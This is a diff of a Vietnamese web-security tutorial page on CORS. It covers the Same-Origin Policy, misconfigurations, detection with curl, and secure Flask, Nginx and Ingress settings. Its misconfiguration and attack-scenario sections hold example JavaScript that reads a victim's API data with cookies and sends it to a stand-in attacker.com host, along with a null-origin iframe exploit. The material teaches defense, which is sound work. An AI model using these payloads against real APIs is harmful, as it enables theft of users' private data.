@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chương 9: CORS — Hieu Nguyen</title>
-  <meta name="description" content="SOP, CORS misconfig, ACAO, credentials, Ingress.">
+  <title>Chương 9: CORS — Cross-Origin Resource Sharing — Hieu Nguyen</title>
+  <meta name="description" content="Chương 9: CORS — Cross-Origin Resource Sharing — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,51 +40,313 @@
         <span>›</span>
         <span>09. CORS</span>
       </div>
-      <h1>Chương 9: CORS</h1>
-      <p class="lede">CORS không phải firewall. Nó là ngoại lệ có kiểm soát của Same-Origin Policy.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> III — Client-side</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p><strong>Same-Origin Policy</strong>: origin = scheme + host + port. JS origin A không đọc response origin B trừ khi B gửi CORS header cho phép.</p>
-<h2 id="misconfig">Misconfiguration</h2>
-<ul>
-        <li>Phản chiếu mọi <code>Origin</code> kèm <code>Access-Control-Allow-Credentials: true</code>.</li>
-        <li>Whitelist regex sai (<code>evilcompany.com</code> khớp <code>company.com</code>).</li>
-        <li>Cho <code>null</code> origin (sandbox iframe).</li>
-        <li>Wildcard <code>*</code> với credential — browser từ chối; đừng “sửa” bằng reflect origin.</li>
-      </ul>
-<h2 id="phong">Phòng chống</h2>
-<ul>
-        <li>Allowlist origin chính xác.</li>
-        <li>API cookie: SameSite + CORS chặt, hoặc tốt hơn: bearer token không dựa cookie cross-origin.</li>
-        <li>Preflight: method/header tối thiểu.</li>
-      </ul>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>Header CORS ở Ingress hay app — một nguồn. Đừng <code>add_header ACAO $http_origin</code> vô điều kiện. Review Helm values <code>cors.origin: '*'</code>.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>SOP mặc định chặn đọc cross-origin.</li>
-        <li>Reflect Origin + credential = hỏng.</li>
-        <li>Allowlist exact.</li>
-        <li>Ingress đừng copy Origin mù.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>Origin gồm gì?</li>
-        <li>Vì sao * + credentials không “mở cho tiện”?</li>
-        <li>null origin đến từ đâu?</li>
-        <li>Preflight OPTIONS lộ gì?</li>
-        <li>CORS có chặn request server-side (curl) không?</li>
-      </ol>
+      <div id="top"></div>
+<header><h1>Chương 9: CORS — Cross-Origin Resource Sharing</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>CORS</strong> (Cross-Origin Resource Sharing — Chia sẻ tài nguyên qua các origin) là cơ chế browser cho phép hoặc từ chối web pages truy cập tài nguyên từ domain khác.</p>
+<p><strong>Mức độ nguy hiểmal:</strong> Trung bình-Cao — CORS misconfiguration cho phép trang web độc hại đọc dữ liệu nhạy cảm từ API của bạn.</p>
+<p>Trước khi hiểu CORS, cần hiểu <strong>Same-Origin Policy</strong> (Chính sách cùng nguồn gốc).</p>
+<hr>
+<h2 id="same-origin-policy-sop">Same-Origin Policy (SOP)</h2>
+<p>SOP là security mechanism của browser: một trang web chỉ có thể đọc response từ cùng một <strong>origin</strong>.</p>
+<p><strong>Origin = scheme + hostname + port:</strong></p>
+<pre><code class="language-text">https://example.com:443 ← origin
 
-      <div class="docs-tags">
-        <span class="docs-tag">cors</span>
-        <span class="docs-tag">sop</span>
-        <span class="docs-tag">headers</span>
-      </div>
+https://example.com/api       ← SAME origin (scheme, host, port giống)
+https://example.com:8080/api  ← DIFFERENT origin (port khác)
+http://example.com/api        ← DIFFERENT origin (scheme khác)
+https://api.example.com/api   ← DIFFERENT origin (subdomain khác)
+https://other.com/api         ← DIFFERENT origin (domain khác)
+</code></pre>
+<p><strong>SOP cho phép:</strong></p>
+<ul>
+<li>Gửi cross-origin requests (GET/POST) — browser gửi nhưng JS không đọc được response</li>
+<li>Load images, scripts, stylesheets từ cross-origin</li>
+<li>Redirect cross-origin</li>
+</ul>
+<p><strong>SOP chặn:</strong></p>
+<ul>
+<li>JavaScript đọc response từ cross-origin fetch/XHR</li>
+<li>Access cookies, localStorage của origin khác</li>
+</ul>
+<hr>
+<h2 id="cors-cho-phép-bypass-sop-có-kiểm-soát">CORS cho phép bypass SOP có kiểm soát</h2>
+<p>Server có thể cho phép specific origins truy cập bằng CORS headers:</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://trusted-app.com
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST
+Access-Control-Allow-Headers: Content-Type, Authorization
+</code></pre>
+<p><strong>Preflight Request (OPTIONS):</strong></p>
+<p>Với &quot;non-simple&quot; requests (PUT, DELETE, custom headers), browser gửi OPTIONS request trước:</p>
+<pre><code class="language-http">OPTIONS /api/data HTTP/1.1
+Origin: https://trusted-app.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: Content-Type, Authorization
+
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://trusted-app.com
+Access-Control-Allow-Methods: GET, POST, PUT
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Max-Age: 3600
+</code></pre>
+<hr>
+<h2 id="cors-misconfigurations">CORS Misconfigurations</h2>
+<h3 id="1-reflect-any-origin">1. Reflect Any Origin</h3>
+<pre><code class="language-python"># SAI: Reflect Origin header vô điều kiện
+@app.after_request
+def add_cors(response):
+    origin = request.headers.get(&#x27;Origin&#x27;)
+    response.headers[&#x27;Access-Control-Allow-Origin&#x27;] = origin  # ← NGUY HIỂM!
+    response.headers[&#x27;Access-Control-Allow-Credentials&#x27;] = &#x27;true&#x27;
+    return response
+</code></pre>
+<p><strong>Khai thác:</strong></p>
+<pre><code class="language-html">&lt;!-- Trang của hacker: attacker.com --&gt;
+&lt;script&gt;
+fetch(&#x27;https://api.victim.com/api/sensitive-data&#x27;, {
+    credentials: &#x27;include&#x27;  // Gửi kèm cookies của victim
+})
+.then(r =&gt; r.json())
+.then(data =&gt; {
+    // Hacker đọc được data của victim!
+    fetch(&#x27;https://attacker.com/steal?data=&#x27; + JSON.stringify(data));
+});
+&lt;/script&gt;
+</code></pre>
+<h3 id="2-whitelist-validation-lỗi">2. Whitelist Validation Lỗi</h3>
+<pre><code class="language-python"># SAI: regex/string match không chặt chẽ
+def is_allowed_origin(origin):
+    # Intended: chỉ allow example.com và subdomains
+    return &#x27;example.com&#x27; in origin
+
+# Bypass:
+# attacker-example.com  → chứa &quot;example.com&quot; → pass!
+# example.com.attacker.com → chứa &quot;example.com&quot; → pass!
+</code></pre>
+<pre><code class="language-python"># ĐÚNG: exact match hoặc regex chặt chẽ
+import re
+
+ALLOWED_ORIGINS = {
+    &quot;https://example.com&quot;,
+    &quot;https://app.example.com&quot;,
+    &quot;https://staging.example.com&quot;
+}
+
+def is_allowed_origin(origin):
+    return origin in ALLOWED_ORIGINS
+
+# Hoặc nếu cần regex:
+ALLOWED_PATTERN = re.compile(r&#x27;^https://([a-z]+\.)?example\.com$&#x27;)
+def is_allowed_origin(origin):
+    return bool(ALLOWED_PATTERN.match(origin))
+</code></pre>
+<h3 id="3-null-origin-whitelist">3. Null Origin Whitelist</h3>
+<pre><code class="language-python"># SAI: Allow null origin (thường dùng cho local dev)
+if origin == &#x27;null&#x27;:
+    response.headers[&#x27;Access-Control-Allow-Origin&#x27;] = &#x27;null&#x27;
+</code></pre>
+<p><strong>Tạo null origin:</strong></p>
+<pre><code class="language-html">&lt;!-- Null origin được tạo bởi: sandboxed iframe, file://, data: URI --&gt;
+&lt;iframe sandbox=&quot;allow-scripts&quot; srcdoc=&quot;
+&lt;script&gt;
+fetch(&#x27;https://api.victim.com/sensitive&#x27;, {credentials: &#x27;include&#x27;})
+  .then(r =&gt; r.json())
+  .then(data =&gt; parent.postMessage(data, &#x27;*&#x27;));
+&lt;/script&gt;
+&quot;&gt;
+&lt;/iframe&gt;
+</code></pre>
+<p>Sandboxed iframe gửi requests với <code>Origin: null</code>. Nếu server accept null → hacker bypass.</p>
+<h3 id="4-wildcard--credentials-impossible-combination">4. Wildcard + Credentials (Impossible Combination)</h3>
+<pre><code class="language-text">Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+</code></pre>
+<p>Browser <strong>từ chối</strong> combination này — không cho phép gửi credentials với wildcard.</p>
+<p>Tuy nhiên một số app cố bypass bằng cách reflect Origin khi request có credentials → tương đương wildcard nhưng bypass browser check.</p>
+<h3 id="5-trusted-subdomain-bị-xss">5. Trusted Subdomain bị XSS</h3>
+<pre><code class="language-text">Access-Control-Allow-Origin: https://subdomain.example.com
+</code></pre>
+<p>Nếu subdomain.example.com bị XSS:</p>
+<pre><code class="language-text">1. Hacker inject script vào subdomain.example.com
+2. Script chạy với origin: subdomain.example.com
+3. Fetch https://api.example.com/data → CORS pass (trusted origin)
+4. Đọc sensitive data → gửi cho hacker
+</code></pre>
+<hr>
+<h2 id="kịch-bản-tấn-công-api-data-theft">Kịch bản tấn công: API Data Theft</h2>
+<pre><code class="language-text">Target: api.bank.com - endpoint GET /api/balance trả về số dư tài khoản
+CORS config: Reflect any origin với credentials
+
+Hacker host trang tại: attacker.com/steal.html
+</code></pre>
+<pre><code class="language-html">&lt;!-- attacker.com/steal.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+// Victim phải đã login bank.com trong cùng browser
+var xhr = new XMLHttpRequest();
+xhr.open(&#x27;GET&#x27;, &#x27;https://api.bank.com/api/balance&#x27;, true);
+xhr.withCredentials = true;  // Gửi kèm bank.com cookies
+
+xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4) {
+        // Gửi balance về cho hacker
+        fetch(&#x27;https://attacker.com/collect?data=&#x27; + 
+              encodeURIComponent(xhr.responseText));
+    }
+};
+xhr.send();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<pre><code class="language-text">Attack flow:
+1. Victim đã login bank.com
+2. Hacker gửi link: attacker.com/steal.html (qua email, chat)
+3. Victim click → page load → fetch đến api.bank.com
+4. CORS: Origin: attacker.com → server reflect → response có ACAO: attacker.com
+5. Browser cho JS đọc response → balance bị lộ
+6. Gửi về attacker.com
+</code></pre>
+<hr>
+<h2 id="cách-phát-hiện">Cách phát hiện</h2>
+<pre><code class="language-bash"># Test CORS manually
+curl -H &quot;Origin: https://attacker.com&quot; \
+     -H &quot;Cookie: session=victim_token&quot; \
+     https://api.example.com/sensitive \
+     -I
+
+# Check response:
+# Có Access-Control-Allow-Origin: https://attacker.com không?
+# Có Access-Control-Allow-Credentials: true không?
+
+# Test null origin
+curl -H &quot;Origin: null&quot; https://api.example.com/sensitive -I
+
+# Test subdomain bypass
+curl -H &quot;Origin: https://attacker-example.com&quot; https://api.example.com/sensitive -I
+</code></pre>
+<p><strong>Checklist:</strong></p>
+<pre><code class="language-text">□ Server reflect bất kỳ Origin nào?
+□ Null origin được accept?
+□ ACAO: * kết hợp với Allow-Credentials: true?
+□ Whitelist validation có bypass được bằng prefix/suffix?
+□ Trusted subdomains có bị XSS không?
+□ HTTP origin được accept dù server là HTTPS?
+□ Có endpoints nhạy cảm không cần auth nhưng return sensitive data?
+</code></pre>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<pre><code class="language-python"># Flask CORS implementation an toàn
+
+ALLOWED_ORIGINS = frozenset([
+    &quot;https://app.example.com&quot;,
+    &quot;https://admin.example.com&quot;,
+])
+
+@app.after_request
+def cors_handler(response):
+    origin = request.headers.get(&#x27;Origin&#x27;)
+    
+    if origin and origin in ALLOWED_ORIGINS:
+        response.headers[&#x27;Access-Control-Allow-Origin&#x27;] = origin
+        response.headers[&#x27;Access-Control-Allow-Credentials&#x27;] = &#x27;true&#x27;
+        response.headers[&#x27;Access-Control-Allow-Methods&#x27;] = &#x27;GET, POST, PUT, DELETE&#x27;
+        response.headers[&#x27;Access-Control-Allow-Headers&#x27;] = &#x27;Content-Type, Authorization&#x27;
+        response.headers[&#x27;Vary&#x27;] = &#x27;Origin&#x27;  # Quan trọng: cho cache biết response thay đổi theo Origin
+    
+    return response
+
+@app.route(&#x27;/api/preflight&#x27;, methods=[&#x27;OPTIONS&#x27;])
+def preflight():
+    response = make_response()
+    cors_handler(response)
+    response.headers[&#x27;Access-Control-Max-Age&#x27;] = &#x27;3600&#x27;
+    return response, 204
+</code></pre>
+<p><strong>Nginx CORS:</strong></p>
+<pre><code class="language-nginx"># Nginx CORS cho phép specific origins
+map $http_origin $cors_origin {
+    default &quot;&quot;;
+    &quot;https://app.example.com&quot; &quot;https://app.example.com&quot;;
+    &quot;https://admin.example.com&quot; &quot;https://admin.example.com&quot;;
+}
+
+server {
+    location /api/ {
+        if ($cors_origin) {
+            add_header &#x27;Access-Control-Allow-Origin&#x27; $cors_origin always;
+            add_header &#x27;Access-Control-Allow-Credentials&#x27; &#x27;true&#x27; always;
+            add_header &#x27;Vary&#x27; &#x27;Origin&#x27; always;
+        }
+        
+        if ($request_method = &#x27;OPTIONS&#x27;) {
+            add_header &#x27;Access-Control-Allow-Methods&#x27; &#x27;GET, POST, PUT, DELETE&#x27; always;
+            add_header &#x27;Access-Control-Allow-Headers&#x27; &#x27;Content-Type, Authorization&#x27; always;
+            add_header &#x27;Access-Control-Max-Age&#x27; 3600;
+            return 204;
+        }
+    }
+}
+</code></pre>
+<hr>
+<h2 id="góc-nhìn-devops">Góc nhìn DevOps</h2>
+<p><strong>Kubernetes Ingress CORS:</strong></p>
+<pre><code class="language-yaml">apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  annotations:
+    nginx.ingress.kubernetes.io/enable-cors: &quot;true&quot;
+    nginx.ingress.kubernetes.io/cors-allow-origin: &quot;https://app.example.com&quot;
+    nginx.ingress.kubernetes.io/cors-allow-credentials: &quot;true&quot;
+    nginx.ingress.kubernetes.io/cors-allow-methods: &quot;GET, POST, PUT, DELETE&quot;
+    nginx.ingress.kubernetes.io/cors-allow-headers: &quot;Content-Type, Authorization&quot;
+    # KHÔNG dùng: cors-allow-origin: &quot;*&quot; với credentials
+</code></pre>
+<p><strong>Environment-specific CORS config:</strong></p>
+<pre><code class="language-python"># Khác nhau giữa environments
+ALLOWED_ORIGINS = {
+    &#x27;production&#x27;: [
+        &#x27;https://app.example.com&#x27;,
+        &#x27;https://admin.example.com&#x27;
+    ],
+    &#x27;staging&#x27;: [
+        &#x27;https://staging.example.com&#x27;,
+        &#x27;https://staging-admin.example.com&#x27;
+    ],
+    &#x27;development&#x27;: [
+        &#x27;http://localhost:3000&#x27;,
+        &#x27;http://localhost:3001&#x27;
+    ]
+}
+
+# Load từ environment variable
+env = os.environ.get(&#x27;APP_ENV&#x27;, &#x27;development&#x27;)
+allowed = ALLOWED_ORIGINS.get(env, [])
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>SOP ngăn JavaScript đọc cross-origin responses — CORS là cơ chế để selectively allow.</li>
+<li>Reflect bất kỳ Origin nào kèm credentials = hoàn toàn bypass SOP.</li>
+<li>Whitelist validation phải exact match — substring match bị bypass.</li>
+<li>Null origin phải bị block trong production.</li>
+<li>Dùng <code>Vary: Origin</code> header để cache hoạt động đúng.</li>
+<li>Trusted subdomain bị XSS → CORS bị exploit.</li>
+<li>Không bao giờ dùng <code>Access-Control-Allow-Origin: *</code> với <code>Allow-Credentials: true</code>.</li>
+</ul>
+<hr>
+<h2 id="câu-hỏi-ôn-tập">Câu hỏi ôn tập</h2>
+<ol>
+<li>Same-Origin Policy là gì và nó bảo vệ chống lại điều gì?</li>
+<li>Tại sao kết hợp <code>Access-Control-Allow-Origin: *</code> và <code>Allow-Credentials: true</code> không hợp lệ?</li>
+<li>Null origin được tạo ra trong tình huống nào? Tại sao nguy hiểm?</li>
+<li>Nếu <code>api.example.com</code> có CORS whitelist là <code>example.com</code> (substring match), hacker bypass thế nào?</li>
+<li>Tại sao cần thêm <code>Vary: Origin</code> header trong CORS response?</li>
+</ol>
       <div class="docs-pager">
         <a href="../08/">Previous · 08. JWT</a>
         <a href="../10/">Next · 10. CSRF</a>
@@ -93,12 +355,21 @@
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#misconfig">Misconfiguration</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#same-origin-policy-sop">Same-Origin Policy (SOP)</a>
+        <a href="#cors-cho-phép-bypass-sop-có-kiểm-soát">CORS cho phép bypass SOP có kiểm soát</a>
+        <a href="#cors-misconfigurations">CORS Misconfigurations</a>
+        <a class="depth-3" href="#1-reflect-any-origin">1. Reflect Any Origin</a>
+        <a class="depth-3" href="#2-whitelist-validation-lỗi">2. Whitelist Validation Lỗi</a>
+        <a class="depth-3" href="#3-null-origin-whitelist">3. Null Origin Whitelist</a>
+        <a class="depth-3" href="#4-wildcard--credentials-impossible-combination">4. Wildcard + Credentials (Impossible Combination)</a>
+        <a class="depth-3" href="#5-trusted-subdomain-bị-xss">5. Trusted Subdomain bị XSS</a>
+        <a href="#kịch-bản-tấn-công-api-data-theft">Kịch bản tấn công: API Data Theft</a>
+        <a href="#cách-phát-hiện">Cách phát hiện</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a href="#góc-nhìn-devops">Góc nhìn DevOps</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
+        <a href="#câu-hỏi-ôn-tập">Câu hỏi ôn tập</a>
       </nav>
     </aside>
   </div>
